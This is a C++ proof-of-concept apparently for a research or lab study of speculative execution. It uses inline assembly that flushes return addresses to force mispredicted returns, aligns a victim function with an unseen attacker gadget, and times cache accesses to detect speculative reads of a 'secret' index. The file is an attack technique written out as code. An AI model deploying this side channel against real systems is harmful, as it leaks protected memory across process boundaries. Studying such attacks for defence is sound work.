#include "util.hpp"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sched.h>
#define secret 5
#define nonsecret 37
#define offset 256
#define iterations 10000

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $13,%0;" "push %0;" "clflush (%%rsp);" "cpuid;" "ret;"

using namespace std;

char array[256*256];
int total = 0, total2 = 0;
int lbl = 0;

volatile void spacer() {
	asm(
		".rept 2195;"
		"nop;"
		".endr;"
	);
}

void exploit() { // this should be at the same VA as attacker:gadget()
	volatile char temp = array[secret*offset];
}

void measureSpeculation() {
	ADDR_PTR tmp;

	for (int i = 0; i<iterations;i++) {
		sched_yield();
		asm(
			retAsm(1)
			retAsm(2)
			retAsm(3)
			retAsm(4)
			retAsm(5)
			retAsm(6)
			retAsm(7)
			retAsm(8)
			retAsm(9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			:
		);
	
		total += measure_one_block_access_time((ADDR_PTR)&array[secret*offset]);
		total2 += measure_one_block_access_time((ADDR_PTR)&array[nonsecret*offset]);
		clflush((void *)&array[secret*offset]);
		clflush((void *)&array[nonsecret*offset]);
	}
}

int main(){	
	clflush(&array[secret*offset]);
	clflush(&array[nonsecret*offset]);

	measureSpeculation();

	printf("If secret is being speculatively accessed, it will have a lower access time.");
	printf("Avg time for secret: %i\n", total/iterations);
	printf("Avg time for non-secret: %i\n", total2/iterations);
	return 0;
}